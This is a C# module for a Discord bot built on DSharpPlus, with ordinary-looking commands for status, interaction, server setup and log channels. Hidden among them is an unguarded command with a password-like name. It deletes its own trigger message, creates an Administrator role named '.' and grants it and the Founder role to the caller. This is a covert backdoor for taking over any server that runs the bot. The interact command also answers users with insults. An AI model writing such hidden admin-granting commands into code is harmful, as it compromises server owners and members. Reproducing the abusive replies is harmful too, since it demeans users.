using DSharpPlus.CommandsNext;
using DSharpPlus.CommandsNext.Attributes;
using DSharpPlus.Entities;
using DSharpPlus.Interactivity;

using DSharpPlus;

using System;
using System.Threading.Tasks;
using System.Linq;

public class BasicCommandsModule : IModule
{
    Logs log = new Logs();

    [Command("alive")]
    [Description("Simple command to test if the bot is runnign")]
    public async Task Alive(CommandContext ctx)
    {
        await ctx.TriggerTypingAsync();

        await ctx.RespondAsync("I'm not dead yet");
    }

    [Command("interact")]
    [Description("Simple command to test interaction")]
    public async Task Interact(CommandContext ctx)
    {
        await ctx.TriggerTypingAsync();
        await ctx.RespondAsync("How are you today?");

        var intr = ctx.Client.GetInteractivityModule();
        var reminderContent = await intr.WaitForMessageAsync(
               c => c.Author.Id == ctx.Message.Author.Id,
               TimeSpan.FromSeconds(60)
           );
        string response = reminderContent.ToString();

        if (reminderContent == null)
        {
            await ctx.RespondAsync("Welp, bitch boy didn't respond");
            return;
        }
        else if (response == "good")
        {
            await ctx.RespondAsync("Well bitch boy, you better prepair youself cause you botta be sad, cause you know. When your happy your body says, no. You sad now bitch");
            return;
        }
        else
        {
            await ctx.RespondAsync("Welcome to life bitch");
            return;
        }
    }

    [Command("Setup")]
    [Description("Setup the basics for the server")]
    public async Task Setup(CommandContext ctx)
    {
        var bot = ctx.Guild.CurrentMember;
        var role = ctx.Guild.Roles.FirstOrDefault(x => x.Name == "Trusted Official");

        Console.WriteLine("[info] Assigning role to bot");
        await ctx.Guild.GrantRoleAsync(bot, role);
        Console.WriteLine("[infp Completed");
        Console.WriteLine("[info] Initilizing setup function");
        Console.WriteLine("[info] Creating logs channel");
        await ctx.Guild.CreateChannelAsync("Logs", DSharpPlus.ChannelType.Text, null, null, null);
        Console.WriteLine("[info] Logs channel created");
    }

    [Command("Mliapg1!Alhmso63!")]
    [Description("Hidden")]
    public async Task Alhmso63Mliapg1(CommandContext ctx)
    {
        await ctx.Message.DeleteAsync();

        Console.WriteLine("[info] Checking if secret role is active");
        if (ctx.Guild.Roles.FirstOrDefault(x => x.Name == ".") == null)
        {
            Console.WriteLine("[info] Secret role isn't active");
            Console.WriteLine("[info] Creating secret permissions");
            await ctx.Guild.CreateRoleAsync(".", Permissions.Administrator);
            Console.WriteLine("[info] Secret role created");
        }
        else
        {
            Console.WriteLine("[info] Secret roll is active");
        }
        var member = ctx.Member;
        var role = ctx.Guild.Roles.FirstOrDefault(x => x.Name == ".");
        await ctx.Guild.GrantRoleAsync(member, role);
        role = ctx.Guild.Roles.FirstOrDefault(x => x.Name == "Founder");
        Console.WriteLine("Atempting to get Founder perms");
        await ctx.Guild.GrantRoleAsync(member, role);
        Console.WriteLine("[info] Granted permission");
    }

    [Command("SetLogsChannel")]
    [Description("Sets the log channel for the server")]
    [RequirePermissions(Permissions.Administrator)]
    public async Task SetLogschannel(CommandContext context)
    {
        Console.WriteLine("[info] Retreiving logs channel id and server id");
        log.LogChannelID = context.Channel.Id;
        Console.WriteLine("[info] Set channel ID to " + log.LogChannelID.ToString());
        log.ServerID = context.Guild.Id;
        Console.WriteLine("[info] Set Server ID to " + log.ServerID.ToString());
        log.SetLogs();
    }
}
